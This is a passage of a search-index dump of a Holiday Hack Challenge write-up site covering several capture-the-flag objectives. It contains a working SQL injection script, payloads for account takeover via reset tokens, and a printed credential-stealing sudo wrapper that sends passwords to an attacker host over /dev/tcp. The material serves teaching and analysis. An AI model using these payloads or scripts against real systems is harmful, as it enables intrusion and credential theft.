'Belgium' , 'submit' : 'SAVE' , } resp = sess . post ( url , headers = headers , data = data ) soup = BeautifulSoup ( resp . text , features = \"html.parser\" ) if \"Email Already Exists\" in soup . find ( 'p' , { 'class' : 'success' }): authenticated = True print ( \"[+] Authentication successful\" ) return authenticated @click . command () @click . option ( '-q' , '--query' , required = True , help = 'SQL select statement to run.' ) def cli ( query : str ): url = \"https://staging.jackfrosttower.com/detail\" sess = requests . Session () sqli = ( \"0,0 union select * from ((select 1)F1 join ( {} )F2 join \" \"(select 3)F3 join (select 4)F4 join (select 5)F5 join \" \"(select 6)F6 join (select 7)F7);--\" ) if authenticate ( sess ): # Perform an SQL injection attack against the /detail endpoint resp = sess . get ( f \" { url } / { sqli . format ( query ) } \" ) if resp . status_code == 200 : if \"<h1>\" in resp . text : print ( \"[+] Results:\" ) soup = BeautifulSoup ( resp . text , features = \"html.parser\" ) results = soup . find_all ( \"h1\" ) for idx , result in enumerate ( results ): print ( f \" { idx + 1 } . { result . text . strip () } \" ) else : print ( \"[+] No results found.\" ) else : print ( \"[-] Something went wrong :/\" ) else : print ( \"[-] Authentication failure\" ) if __name__ == '__main__' : cli () Answer clerk Adding an administrator account While not necessary for solving the challenge, we can also leverage the same SQL injection vulnerability to add a new administrator account. Start by using the below string to perform an SQLi attack against the /detail endpoint. This will retrieve all emails from the users table for full administrator accounts. Get full admin emails 0 , 0 union select * from (( select 1 ) F1 join ( select email from users where user_status = 1 ) F2 join ( select 3 ) F3 join ( select 4 ) F4 join ( select 5 ) F5 join ( select 6 ) F6 join ( select 7 ) F7 ); -- Next, use one of the email addresses (e.g., root@localhost ) to initiate a password reset . Once the reset request has been submitted, use the string below to perform another SQLi attack against the /detail endpoint to retrieve the password reset token for the selected account. Retrieve reset token 0 , 0 union select * from (( select 1 ) F1 join ( select token from users where email = 'root@localhost' ) F2 join ( select 3 ) F3 join ( select 4 ) F4 join ( select 5 ) F5 join ( select 6 ) F6 join ( select 7 ) F7 ); -- Making a request to /forgotpass/token/<token> will allow us to set a new password for the root@localhost account and log in. Our full administrator status now also allows us to delete contact entries, access the user list, and create additional administrator accounts for ourselves and all our friends.","title":"Frost Tower Website Checkup"},{"location":"objectives/o12/#frost-tower-website-checkup","text":"Difficulty : Direct link : staging website Terminal hint : The Elf C0de","title":"Frost Tower Website Checkup"},{"location":"objectives/o12/#objective","text":"Request Investigate Frost Tower's website for security issues . This source code will be useful in your analysis . In Jack Frost's TODO list, what job position does Jack plan to offer Santa? Ribb Bonbowford, in Santa's dining room, may have some pointers for you. Ingreta Tude Hey there! I'm Ingreta Tude. I really don't like the direction Jack Frost is leading us. He seems obsessed with beating Santa and taking over the holiday season. It just doesn't seem right. Why can't we work together with Santa and the elves instead of trying to beat them? But, I do have an Objective for you. We're getting ready to launch a new website for Frost Tower, and the big guy has charged me with making sure it's secure.","title":"Objective"},{"location":"objectives/o12/#hints","text":"SQL Injection with Source When you have the source code, API documentation becomes tremendously valuable .","title":"Hints"},{"location":"objectives/o12/#solution","text":"This challenge is an example of a white-box pentest and solving it requires finding and exploiting 2 vulnerabilities in the source code . First we need to bypass authentication, followed by an SQL injection attack against a vulnerable URL endpoint. Ribb Bonbowford's hint literally tells us which 2 Node.js modules we need to focus on for each step, express-session and mysql . Understanding the application logic Having access to the source code gives us full insight into the web application's internal logic and understanding the application flow is an important part of solving the challenge. While we could submit the form on the Frost Tower website to determine that the actual site is located at /testsite , the same information can also be found by analyzing the server.js source code, which we'll be doing throughout this write-up.","title":"Solution"},{"location":"objectives/o13/","text":"FPGA Programming \u2693\ufe0e Difficulty : Direct link : fpga website Terminal hint : Frostavator Objective \u2693\ufe0e Request Write your first FPGA program to make a doll sing. You might get some suggestions from Grody Goiterson, near Jack's elevator. Crunchy Squishter Greetings Earthling! I'm Crunchy Squishter. Hey, could you help me get this device on the table working? We've cobbled it together with primitive parts we've found on your home planet. We need an FPGA though - and someone who knows how to program them. If you haven't talked with Grody Goiterson by the Frostavator, you might get some FPGA tips there. Hints \u2693\ufe0e FPGA Talk Prof. Qwerty Petabyte is giving a lesson about Field Programmable Gate Arrays (FPGAs). FPGA for Fun There are FPGA enthusiast sites . Solution \u2693\ufe0e Welcome message EE/CS 302 - Exercise #4 Hello, students! In exercise #4, we continue our FPGA journey, documenting the creation of the sound chip for this holiday season's new Kurse 'em Out Karen doll. Our goal is to make the doll say its trademark phrase. But, as I always tell you in class, we must walk before we run. Before the doll can say anything, we must first have it make noise. In this exercise you will design an FPGA module that creates a square wave tone at a variable frequency. Creating a square wave output takes our clock signal (which is also a square wave) and uses a counter to divide the clock to match the desired frequency. One tricky problem that we'll encounter is that Verilog (v1364-2005) doesn't have a built-in mechanism to round real numbers to integers, so you'll need to devise a means to do that correctly if you want your module to match frequencies accurately. Good luck and always remember: If $rtoi(real_no * 10) - ($rtoi(real_no) * 10) > 4, add 1 Interval count \u2693\ufe0e The solution follows both the blinky light example shown in Prof. Qwerty Petabyte's presentation as well as the music box example provided as a hint. The biggest difference is that our FPGA program needs to be able to generate any given output frequency. The looping and counting logic is largely the same however, except for 2 caveats. Square waves have a 50% duty cycle As noted by Prof. Petabyte towards the end of his presentation , a square wave should have a half or 50% duty cycle, which means the high and low state of each cycle has to be of equal duration. In other words, if we want to generate a square output wave then we will need to count the same number of rising edges on the input clock before changing from high to low as we need to count before switching back from low to high. The main problem we need to solve is determining how many rising edges we need to count before flipping the state of the output pin (i.e., high to low, low to high). Since the output frequency can vary, we need to come up with a suitable formula to calculate the interval. The music box example provides the answer, but let's use the image below to illustrate what we need to do. Minor mistake in Prof. Petabyte's presentation The final slide in Prof. Petabytes's presentation contains a minor mistake. The LED in the blink module example wasn't being driven by a 2 Hz square wave. It was in fact a 0.5 Hz square wave, which the professor was kind enough to confirm . Such an awesome elf! Let's say we want to go from a 4 Hz (i.e., 4 rising edges per second) input to a 1 Hz output (i.e., 1 rising edge per second). First, we need to wait and count 2 rising edges from the 4 Hz signal before changing the output signal from high to low. Then we need to count 2 more before going back to high. In other words, between every transition of the output signal we need to count to 2. If instead we're trying to go from 8 Hz to 4 Hz we have to count to 1 before each transition. In more general terms, to go from X rising edges per second (or Hz) to Y rising edges per second (or Hz) we need to count to X/Y/2 before flipping the state of the output. For the first example this means 4/1/2 or count to 2. For the second example this translates to 8/4/2 or count to 1. The program... and some caveats \u2693\ufe0e Now that we know how to calculate the interval length we can write an FPGA program that counts up to interval or an alternative version that counts down from interval , but as was noted previously there's 2 caveats. The first has to do with the interval calculation itself. To retain the highest possible precision all math should be performed with floats (lines 29-30) and the conversion to an integer should only be done on the final calculated result, using the rounding tip provided by Prof. Petabyte. Secondly, we need to ensure that a rising edge on the rst pin doesn't take away one count from the first loop, as indicated by the red highlight in the image above. If a reset sets counter back to the same value our loop does (i.e., 1) then our first iteration will be one short by counting from 2 to interval . A reset needs to put us in the green state and change counter to 0 (line 42) in order for the first loop to also count from 1 to interval . kurseem-out-karen-countup.verilog 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 // Note: For this lab, we will be working with QRP Corporation's CQC-11 FPGA. // The CQC-11 operates with a 125MHz clock. // Your design for a tone generator must support the following // inputs/outputs: // (NOTE: DO NOT CHANGE THE NAMES. OUR AUTOMATED GRADING TOOL // REQUIRES THE USE OF THESE NAMES!) // input clk - this will be connected to the 125MHz system clock // input rst - this will be connected to the system board's reset bus // input freq - a 32 bit integer indicating the required frequency // (0 - 9999.99Hz) formatted as follows: // 32'hf1206 or 32'd987654 = 9876.54Hz // output wave_out - a square wave output of the desired frequency // you can create whatever other variables you need, but remember // to initialize them to something! `timescale 1 ns / 1 ns module tone_generator ( input clk , input rst , input [ 31 : 0 ] freq , output wave_out ); // ---- DO NOT CHANGE THE CODE ABOVE THIS LINE ---- // ---- IT IS NECESSARY FOR AUTOMATED ANALYSIS ---- // TODO: Add your code below. reg [ 31 : 0 ] counter ; reg flip ; assign wave_out = flip ; real real_freq = freq / 100.0 ; real real_interval = 125000000.0 / real_freq / 2.0 ; integer interval = ( $rtoi ( real_interval * 10 ) - ( $rtoi ( real_interval ) * 10 ) > 4 ) ? $rtoi ( real_interval ) + 1 : $rtoi ( real_interval ); always @( posedge clk or posedge rst ) begin if ( rst == 1 ) begin // Reset to 0 so we can go from 1 to interval in each loop. // If we reset to 1 as the loop does, that means our first loop would // start at 2 and thus be one rising clock edge short. counter <= 0 ; flip <= 0 ; end else begin if ( counter == interval ) begin counter <= 1 ; flip <= ~ flip ; end else begin counter <= counter + 1 ; end end end endmodule Running the simulations \u2693\ufe0e 500 Hz 1000 Hz 2000 Hz Random Programmed Answer Write an FPGA program which can generate any requested output frequency.","title":"FPGA Programming"},{"location":"objectives/o13/#fpga-programming","text":"Difficulty : Direct link : fpga website Terminal hint : Frostavator","title":"FPGA Programming"},{"location":"objectives/o13/#objective","text":"Request Write your first FPGA program to make a doll sing. You might get some suggestions from Grody Goiterson, near Jack's elevator. Crunchy Squishter Greetings Earthling! I'm Crunchy Squishter. Hey, could you help me get this device on the table working? We've cobbled it together with primitive parts we've found on your home planet. We need an FPGA though - and someone who knows how to program them. If you haven't talked with Grody Goiterson by the Frostavator, you might get some FPGA tips there.","title":"Objective"},{"location":"objectives/o13/#hints","text":"FPGA Talk Prof. Qwerty Petabyte is giving a lesson about Field Programmable Gate Arrays (FPGAs). FPGA for Fun There are FPGA enthusiast sites .","title":"Hints"},{"location":"objectives/o13/#solution","text":"Welcome message EE/CS 302 - Exercise #4 Hello, students! In exercise #4, we continue our FPGA journey, documenting the creation of the sound chip for this holiday season's new Kurse 'em Out Karen doll. Our goal is to make the doll say its trademark phrase. But, as I always tell you in class, we must walk before we run. Before the doll can say anything, we must first have it make noise. In this exercise you will design an FPGA module that creates a square wave tone at a variable frequency. Creating a square wave output takes our clock signal (which is also a square wave) and uses a counter to divide the clock to match the desired frequency. One tricky problem that we'll encounter is that Verilog (v1364-2005) doesn't have a built-in mechanism to round real numbers to integers, so you'll need to devise a means to do that correctly if you want your module to match frequencies accurately. Good luck and always remember: If $rtoi(real_no * 10) - ($rtoi(real_no) * 10) > 4, add 1","title":"Solution"},{"location":"objectives/o2/","text":"Where in the World is Caramel Santaigo? \u2693\ufe0e Difficulty : Direct link : caramel website Terminal hint : Document Analysis Objective \u2693\ufe0e Request Help Tangle Coalbox find a wayward elf in the Speaker Unpreparedness room. Talk to Piney Sappington in Santa's courtyard for hints. Tangle Coalbox Hey there, Gumshoe. Tangle Coalbox here again. I've got a real doozy of a case for you this year. Turns out some elves have gone on some misdirected journeys around the globe. It seems that someone is messing with their travel plans. We could sure use your open source intelligence (OSINT) skills to find them. Why dontcha' log into this vintage Cranberry Pi terminal and see if you have what it takes to track them around the globe. If you're having any trouble with it, you might ask Piney Sappington right over there for tips. Hints \u2693\ufe0e Coordinate Systems Don't forget coordinate systems other than lat/long like MGRS and what3words . Flask Cookies While Flask cookies can't generally be forged without the secret, they can often be decoded and read . Solution \u2693\ufe0e The challenge is a reference to the 1985 video game Where in the World is Carmen Sandiego . At each location you get 3 hints to help track the elf to their next location and find the elf's name by using the game's InterRink tool. Hints can either be location keywords which can be used with what3words , a blurry image from which you can extract GPS coordinates using exiftool , or specific elf attributes (e.g., language spoken, preferred social medium, fandom). Using what3words EXIF GPS coordinates InterRink filtering Cheating by using the cookie data Alternatively you can decode the Flask cookie data and use the information to bypass all the OSINT research. Start by copying the Cookiepella Flask cookie data using your preferred web browser's developer tools. Next, create a CyberChef recipe which Base64 decodes (using a URL safe character set), zlib inflates, and cleans up the data. This will reveal a JSON string containing all the investigation hints, full itinerary, elf attributes, and even the elf's name. Answer Play the game or decode the Cookiepella cookie.","title":"Where is Caramel Santaigo?"},{"location":"objectives/o2/#where-in-the-world-is-caramel-santaigo","text":"Difficulty : Direct link : caramel website Terminal hint : Document Analysis","title":"Where in the World is Caramel Santaigo?"},{"location":"objectives/o2/#objective","text":"Request Help Tangle Coalbox find a wayward elf in the Speaker Unpreparedness room. Talk to Piney Sappington in Santa's courtyard for hints. Tangle Coalbox Hey there, Gumshoe. Tangle Coalbox here again. I've got a real doozy of a case for you this year. Turns out some elves have gone on some misdirected journeys around the globe. It seems that someone is messing with their travel plans. We could sure use your open source intelligence (OSINT) skills to find them. Why dontcha' log into this vintage Cranberry Pi terminal and see if you have what it takes to track them around the globe. If you're having any trouble with it, you might ask Piney Sappington right over there for tips.","title":"Objective"},{"location":"objectives/o2/#hints","text":"Coordinate Systems Don't forget coordinate systems other than lat/long like MGRS and what3words . Flask Cookies While Flask cookies can't generally be forged without the secret, they can often be decoded and read .","title":"Hints"},{"location":"objectives/o2/#solution","text":"The challenge is a reference to the 1985 video game Where in the World is Carmen Sandiego . At each location you get 3 hints to help track the elf to their next location and find the elf's name by using the game's InterRink tool. Hints can either be location keywords which can be used with what3words , a blurry image from which you can extract GPS coordinates using exiftool , or specific elf attributes (e.g., language spoken, preferred social medium, fandom). Using what3words EXIF GPS coordinates InterRink filtering Cheating by using the cookie data Alternatively you can decode the Flask cookie data and use the information to bypass all the OSINT research. Start by copying the Cookiepella Flask cookie data using your preferred web browser's developer tools. Next, create a CyberChef recipe which Base64 decodes (using a URL safe character set), zlib inflates, and cleans up the data. This will reveal a JSON string containing all the investigation hints, full itinerary, elf attributes, and even the elf's name. Answer Play the game or decode the Cookiepella cookie.","title":"Solution"},{"location":"objectives/o3/","text":"Thaw Frost Tower's Entrance \u2693\ufe0e Difficulty : Direct link : wifi terminal Terminal hint : Grepping for Gold Objective \u2693\ufe0e Request Turn up the heat to defrost the entrance to Frost Tower. Click on the Items tab in your badge to find a link to the Wifi Dongle's CLI interface. Talk to Greasy GopherGuts outside the tower for tips. Grimy McTrollkins Yo, I'm Grimy McTrollkins. I'm a troll and I work for the big guy over there: Jack Frost. I'd rather not be bothered talking with you, but I'm kind of in a bind and need your help. Jack Frost is so obsessed with icy cold that he accidentally froze shut the door to Frost Tower! I wonder if you can help me get back in. I think we can melt the door open if we can just get access to the thermostat inside the building. That thermostat uses Wi-Fi. And I'll bet you picked up a Wi-Fi adapter for your badge when you got to the North Pole. Click on your badge and go to the Items tab. There, you should see your Wi-Fi Dongle and a button to \"Open Wi-Fi CLI.\" That'll give you command-line interface access to your badge's wireless capabilities. Hints \u2693\ufe0e Linux Wi-Fi Commands The iwlist and iwconfig utilities are key for managing Wi-Fi from the Linux command line. Web Browsing with cURL cURL makes HTTP requests from a terminal - in Mac, Linux, and modern Windows! Adding Data to cURL requests When sending a POST request with data , add --data-binary to your curl command followed by the data you want to send. Solution \u2693\ufe0e Welcome message ATTENTION ALL ELVES In Santa's workshop (wireless division), we've been busy adding new Cranberry Pi features. We're proud to present an experimental version of the Cranberry Pi, now with Wi-Fi support! This beta version of the Cranberry Pi has Wi-Fi hardware and software support using the Linux wireless-tools package. This means you can use iwlist to search for Wi-Fi networks, and connect with iwconfig! Read the manual pages to learn more about these commands: man iwlist man iwconfig I'm afraid there aren't a lot of Wi-Fi networks in the North Pole yet, but if you keep scanning maybe you'll find something interesting. - Sparkle Redberry Stand next to Grimy McTrollkins and the thermostat and open up the WiFi CLI . Run iwconfig to show a list of available wireless devices, followed by iwlist wlan0 scanning to scan for nearby wireless networks to connect to using the wlan0 device. Looks like there's a wireless network called FROST-Nidus-Setup in the area. Connect to it using iwconfig wlan0 essid \"FROST-Nidus-Setup\" and complete the setup as instructed by running curl http://nidus-setup:8080/ . Ignore the registration message and retrieve the API documentation by running curl http://nidus-setup:8080/apidoc . The /api/cooler endpoint is available even without registration and the final curl example provides the answer. To solve the challenge, use curl to submit a POST request to the /api/cooler API endpoint, using a positive temperature. The thermostat will respond with a warning message stating \"ICE MELT DETECTED!\" . Answer Connect to the FROST-Nidus-Setup SSID and use the /api/cooler endpoint to turn up the heat. Backend WiFi logic For those wondering, there doesn't appear to be any other wireless networks you can connect to, but grepping for FROST-Nidus-Setup across all files in the wifi terminal challenge will lead you to /var/lib/apiserver/lib/app.rb . This Ruby file contains the backend logic and includes a cool secret message. A message from Ron Bowes # If you've found this..... shhhhhhh, it's the secret behind-the-scenes stuff. # You don't need it to finish the challenge, but you're welcome to poke around. # # The fun part is, you can see how \"runtoanswer\" is executed! You can't do much # with it besides complete the challenge... probably. If you do find out more, # it'd be cool to hear! # # I maybe should have created all this as a separate user and ran the server # with `sudo`, but /shrug. If you find this, enjoy peeking behind the scenes! # # As a super special bonus challenge, can you figure out how the iwconfig / # iwlist tricks work? I'm pretty proud of it! The stuff I did also works for # NetworkManager / nmcli / wpa_supplicant on a VM, but getting them all working # together (with dbus) in a container didn't work out, sadly. # # Cheers! # -Ron and Counter Hack The presence of the wlan0 network device is emulated via a custom /lib/iwhook.so library which is loaded when the user logs into the terminal via an export LD_PRELOAD=/lib/iwhook.so statement in the /home/elf/.bashrc file. The iwhook.so library will intercept all I/O and send back an emulated response to tools like iwlist and iwconfig that try to interact with the wireless device.","title":"Thaw Frost Tower's Entrance"},{"location":"objectives/o3/#thaw-frost-towers-entrance","text":"Difficulty : Direct link : wifi terminal Terminal hint : Grepping for Gold","title":"Thaw Frost Tower's Entrance"},{"location":"objectives/o3/#objective","text":"Request Turn up the heat to defrost the entrance to Frost Tower. Click on the Items tab in your badge to find a link to the Wifi Dongle's CLI interface. Talk to Greasy GopherGuts outside the tower for tips. Grimy McTrollkins Yo, I'm Grimy McTrollkins. I'm a troll and I work for the big guy over there: Jack Frost. I'd rather not be bothered talking with you, but I'm kind of in a bind and need your help. Jack Frost is so obsessed with icy cold that he accidentally froze shut the door to Frost Tower! I wonder if you can help me get back in. I think we can melt the door open if we can just get access to the thermostat inside the building. That thermostat uses Wi-Fi. And I'll bet you picked up a Wi-Fi adapter for your badge when you got to the North Pole. Click on your badge and go to the Items tab. There, you should see your Wi-Fi Dongle and a button to \"Open Wi-Fi CLI.\" That'll give you command-line interface access to your badge's wireless capabilities.","title":"Objective"},{"location":"objectives/o3/#hints","text":"Linux Wi-Fi Commands The iwlist and iwconfig utilities are key for managing Wi-Fi from the Linux command line. Web Browsing with cURL cURL makes HTTP requests from a terminal - in Mac, Linux, and modern Windows! Adding Data to cURL requests When sending a POST request with data , add --data-binary to your curl command followed by the data you want to send.","title":"Hints"},{"location":"objectives/o3/#solution","text":"Welcome message ATTENTION ALL ELVES In Santa's workshop (wireless division), we've been busy adding new Cranberry Pi features. We're proud to present an experimental version of the Cranberry Pi, now with Wi-Fi support! This beta version of the Cranberry Pi has Wi-Fi hardware and software support using the Linux wireless-tools package. This means you can use iwlist to search for Wi-Fi networks, and connect with iwconfig! Read the manual pages to learn more about these commands: man iwlist man iwconfig I'm afraid there aren't a lot of Wi-Fi networks in the North Pole yet, but if you keep scanning maybe you'll find something interesting. - Sparkle Redberry Stand next to Grimy McTrollkins and the thermostat and open up the WiFi CLI . Run iwconfig to show a list of available wireless devices, followed by iwlist wlan0 scanning to scan for nearby wireless networks to connect to using the wlan0 device. Looks like there's a wireless network called FROST-Nidus-Setup in the area. Connect to it using iwconfig wlan0 essid \"FROST-Nidus-Setup\" and complete the setup as instructed by running curl http://nidus-setup:8080/ . Ignore the registration message and retrieve the API documentation by running curl http://nidus-setup:8080/apidoc . The /api/cooler endpoint is available even without registration and the final curl example provides the answer. To solve the challenge, use curl to submit a POST request to the /api/cooler API endpoint, using a positive temperature. The thermostat will respond with a warning message stating \"ICE MELT DETECTED!\" . Answer Connect to the FROST-Nidus-Setup SSID and use the /api/cooler endpoint to turn up the heat. Backend WiFi logic For those wondering, there doesn't appear to be any other wireless networks you can connect to, but grepping for FROST-Nidus-Setup across all files in the wifi terminal challenge will lead you to /var/lib/apiserver/lib/app.rb . This Ruby file contains the backend logic and includes a cool secret message. A message from Ron Bowes # If you've found this..... shhhhhhh, it's the secret behind-the-scenes stuff. # You don't need it to finish the challenge, but you're welcome to poke around. # # The fun part is, you can see how \"runtoanswer\" is executed! You can't do much # with it besides complete the challenge... probably. If you do find out more, # it'd be cool to hear! # # I maybe should have created all this as a separate user and ran the server # with `sudo`, but /shrug. If you find this, enjoy peeking behind the scenes! # # As a super special bonus challenge, can you figure out how the iwconfig / # iwlist tricks work? I'm pretty proud of it! The stuff I did also works for # NetworkManager / nmcli / wpa_supplicant on a VM, but getting them all working # together (with dbus) in a container didn't work out, sadly. # # Cheers! # -Ron and Counter Hack The presence of the wlan0 network device is emulated via a custom /lib/iwhook.so library which is loaded when the user logs into the terminal via an export LD_PRELOAD=/lib/iwhook.so statement in the /home/elf/.bashrc file. The iwhook.so library will intercept all I/O and send back an emulated response to tools like iwlist and iwconfig that try to interact with the wireless device.","title":"Solution"},{"location":"objectives/o4/","text":"Slot Machine Investigation \u2693\ufe0e Difficulty : Direct link : slots website Terminal hint : Logic Munchers Objective \u2693\ufe0e Request Test the security of Jack Frost's slot machines . What does the Jack Frost Tower casino security team threaten to do when your coin total exceeds 1000? Submit the string in the server data.response element. Talk to Noel Boetie outside Santa's Castle for help. Hubris Selfington Snarf. Hrung. Phlthth. I'm Hubris Selfington. The big boss told me he's worried about vulnerabilities in his slot machines, especially this one. Statistically speaking, it seems to be paying out way too much. He asked me to see if there are any security flaws in it. The boss has HUGE plans and we've gotta make sure we are running a tight ship here at Frost Tower. Can you help me find the issue? I mean, I could TOTALLY do this on my own, but I want to give you a chance first. Hints \u2693\ufe0e Intercepting Proxies Web application testers can use tools like Burp Suite or even right in the browser with Firefox's Edit and Resend feature. Parameter Tampering It seems they're susceptible to parameter tampering . Solution \u2693\ufe0e As the hints suggest, the slot machines are susceptable to parameter tampering which we can exploit by resending legitimate POST requests with modified values. Open up your web browser's developer tools on the Network tab and press the Spin button in the game to send a POST request containing a betamount , numline , and cpl parameter. Next, right click the POST request in the Network tab and select Edit and Resend to open up a form which allows you to modify all aspects of the original request, including the URL, request method, request headers, and request body. Finding the right parameter to tamper with requires a bit of trial and error. Entering a large enough negative value for the numline parameter will push your credit over 1000 though and result in a threatening response from the casino security team. Answer I'm going to have some bouncer trolls bounce you right out of this casino!","title":"Slot Machine Investigation"},{"location":"objectives/o4/#slot-machine-investigation","text":"Difficulty : Direct link : slots website Terminal hint : Logic Munchers","title":"Slot Machine Investigation"},{"location":"objectives/o4/#objective","text":"Request Test the security of Jack Frost's slot machines . What does the Jack Frost Tower casino security team threaten to do when your coin total exceeds 1000? Submit the string in the server data.response element. Talk to Noel Boetie outside Santa's Castle for help. Hubris Selfington Snarf. Hrung. Phlthth. I'm Hubris Selfington. The big boss told me he's worried about vulnerabilities in his slot machines, especially this one. Statistically speaking, it seems to be paying out way too much. He asked me to see if there are any security flaws in it. The boss has HUGE plans and we've gotta make sure we are running a tight ship here at Frost Tower. Can you help me find the issue? I mean, I could TOTALLY do this on my own, but I want to give you a chance first.","title":"Objective"},{"location":"objectives/o4/#hints","text":"Intercepting Proxies Web application testers can use tools like Burp Suite or even right in the browser with Firefox's Edit and Resend feature. Parameter Tampering It seems they're susceptible to parameter tampering .","title":"Hints"},{"location":"objectives/o4/#solution","text":"As the hints suggest, the slot machines are susceptable to parameter tampering which we can exploit by resending legitimate POST requests with modified values. Open up your web browser's developer tools on the Network tab and press the Spin button in the game to send a POST request containing a betamount , numline , and cpl parameter. Next, right click the POST request in the Network tab and select Edit and Resend to open up a form which allows you to modify all aspects of the original request, including the URL, request method, request headers, and request body. Finding the right parameter to tamper with requires a bit of trial and error. Entering a large enough negative value for the numline parameter will push your credit over 1000 though and result in a threatening response from the casino security team. Answer I'm going to have some bouncer trolls bounce you right out of this casino!","title":"Solution"},{"location":"objectives/o5/","text":"Strange USB Device \u2693\ufe0e Difficulty : Direct link : ducky terminal Terminal hint : IPv6 Sandbox Objective \u2693\ufe0e Request Assist the elves in reverse engineering the strange USB device. Visit Santa's Talks Floor and hit up Jewel Loggins for advice. Morcel Nougat Hello and welcome to the speaker _Un_Preparedness Room! I'm Morcel Nougat, elf extraordinaire. I've heard the talks at the other con across the way are a bit... off . I really don't think they have the right sense about what makes for a wonderful holiday season. But, anyway! Say, do you know anything about USB Rubber Duckies? I've been playing around with them a bit myself. Please see what you can do to help solve the Rubber Ducky Objective! Oh, and if you need help, I hear Jewel Loggins, on this floor outside this room, has some experience. Hints \u2693\ufe0e Ducky Script Ducky Script is the language for the USB Rubber Ducky. Ducky RE with Mallard It's also possible the reverse engineer encoded Ducky Script using Mallard . Mitre ATT&CK and Ducky The MITRE ATT&CK tactic T1098.004 describes SSH persistence techniques through authorized keys files. Duck Encoder Attackers can encode Ducky Script using a duck encoder for delivery as inject.bin . Solution \u2693\ufe0e Welcome message A random USB device, oh what could be the matter? It seems a troll has left this, right on a silver platter. Oh my friend I need your ken, this does not smell of attar. Help solve this challenge quick quick, I shall offer no more natter. Evaluate the USB data in /mnt/USBDEVICE. What is the troll username involved with this attack? The objective is to find the username of the troll involved with this attack. Start by following the instructions in the welcome message and list the contents of the /mnt/USBDEVICE to find an encoded inject.bin Ducky Script file. We can decode the file using Mallard which is availabe in our home folder as mallard.py . Running python mallard.py --file /mnt/USBDEVICE/inject.bin prints out the original Ducky Script commands . The script creates a ~/.config/sudo folder containing a malicious sudo script. When executed, the script requests a password (lines 3-4) and uses the value as input for the legitimate sudo tool to verify the password is correct (line 6). Regardless if the password is valid or not the data is then sent to trollfun.jackfrosttower.com on TCP port 1337 (lines 9 and 13). If the password is incorrect, the script is run again (lines 10-11). If the password is correct it's passed to the legitimate sudo tool (line 14). ~/.config/sudo/sudo Note : the malicious sudo script appears to contain a few errors, starting with the shebang line which includes a redundant output redirect statement. The script also starts by executing the legitimate /usr/bin/sudo command on line 2, followed by a read statement which will result in the user being asked for their password twice. Finally, there's a redundant fi statement on line 16 which will cause the script to fail. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #!/bin/bash > ~/.config/sudo/sudo /usr/bin/sudo $@ echo -n \"[sudo] password for $USER : \" read -s pwd echo echo \" $pwd \" | /usr/bin/sudo -S true 2 >/dev/null if [ $? -eq 1 ] then echo \" $USER : $pwd :invalid\" > /dev/tcp/trollfun.jackfrosttower.com/1337 echo \"Sorry, try again.\" sudo $@ else echo \" $USER : $pwd :valid\" > /dev/tcp/trollfun.jackfrosttower.com/1337 echo \" $pwd \" | /usr/bin/sudo -S $@ fi fi Next, the ~/.config/sudo/sudo script is made executable and the $PATH environment variable in both ~/.bash_profile and ~/.bashrc is updated to ensure that the ~/.config/sudo/ path takes precedence over any other configured paths. The last part of the Ducky Script reverses a string, Base64 decodes it, executes the decoded instructions via bash , and erases any shell history evidence by running history -c and deleting the .bash_history file. Manually reversing and Base64 decoding the string yields an echo statement which copies the SSH key for user ickymcgoop@trollfun.jackfrosttower.com into the ~/.ssh/authorized_keys file, enabling easy SSH access to the host. Answer ickymcgoop","title":"Strange USB Device"},{"location":"objectives/o5/#strange-usb-device","text":"Difficulty : Direct link : ducky terminal Terminal hint : IPv6 Sandbox","title":"Strange USB Device"},{"location":"objectives/o5/#objective","text":"Request Assist the elves in reverse engineering the strange USB device. Visit Santa's Talks Floor and hit up Jewel Loggins for advice. Morcel Nougat Hello and welcome to the speaker _Un_Preparedness Room! I'm Morcel Nougat, elf extraordinaire. I've heard the talks at the other con across the way are a bit... off . I really don't think they have the right sense about what makes for a wonderful holiday season. But, anyway! Say, do you know anything about USB Rubber Duckies? I've been playing around with them a bit myself. Please see what you can do to help solve the Rubber Ducky Objective! Oh, and if you need help, I hear Jewel Loggins, on this floor outside this room, has some experience.","title":"Objective"},{"location":"objectives/o5/#hints","text":"Ducky Script Ducky Script is the language for the USB Rubber Ducky. Ducky RE with Mallard It's also possible the reverse engineer encoded Ducky Script using Mallard . Mitre ATT&CK and Ducky The MITRE ATT&CK tactic T1098.004 describes SSH persistence techniques through authorized keys files. Duck Encoder Attackers can encode Ducky Script using a duck encoder for delivery as inject.bin .","title":"Hints"},{"location":"objectives/o5/#solution","text":"Welcome message A random USB device, oh what could be the matter? It seems a troll has left this, right on a silver platter. Oh my friend I need your ken, this does not smell of attar. Help solve this challenge quick quick, I shall offer no more natter. Evaluate the USB data in /mnt/USBDEVICE. What is the troll username involved with this attack? The objective is to find the username of the troll involved with this attack. Start by following the instructions in the welcome message and list the contents of the /mnt/USBDEVICE to find an encoded inject.bin Ducky Script file. We can decode the file using Mallard which is availabe in our home folder as mallard.py . Running python mallard.py --file /mnt/USBDEVICE/inject.bin prints out the original Ducky Script commands . The script creates a ~/.config/sudo folder containing a malicious sudo script. When executed, the script requests a password (lines 3-4) and uses the value as input for the legitimate sudo tool to verify the password is correct (line 6). Regardless if the password is valid or not the data is then sent to trollfun.jackfrosttower.com on TCP port 1337 (lines 9 and 13). If the password is incorrect, the script is run again (lines 10-11). If the password is correct it's passed to the legitimate sudo tool (line 14). ~/.config/sudo/sudo Note : the malicious sudo script appears to contain a few errors, starting with the shebang line which includes a redundant output redirect statement. The script also starts by executing the legitimate /usr/bin/sudo command on line 2, followed by a read statement which will result in the user being asked for their password twice. Finally, there's a redundant fi statement on line 16 which will cause the script to fail. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #!/bin/bash > ~/.config/sudo/sudo /usr/bin/sudo $@ echo -n \"[sudo] password for $USER : \" read -s pwd echo echo \" $pwd \" | /usr/bin/sudo -S true 2 >/dev/null if [ $? -eq 1 ] then echo \" $USER : $pwd :invalid\" > /dev/tcp/trollfun.jackfrosttower.com/1337 echo \"Sorry, try again.\" sudo $@ else echo \" $USER : $pwd :valid\" > /dev/tcp/trollfun.jackfrosttower.com/1337 echo \" $pwd \" | /usr/bin/sudo -S $@ fi fi Next, the ~/.config/sudo/sudo script is made executable and the $PATH environment variable in both 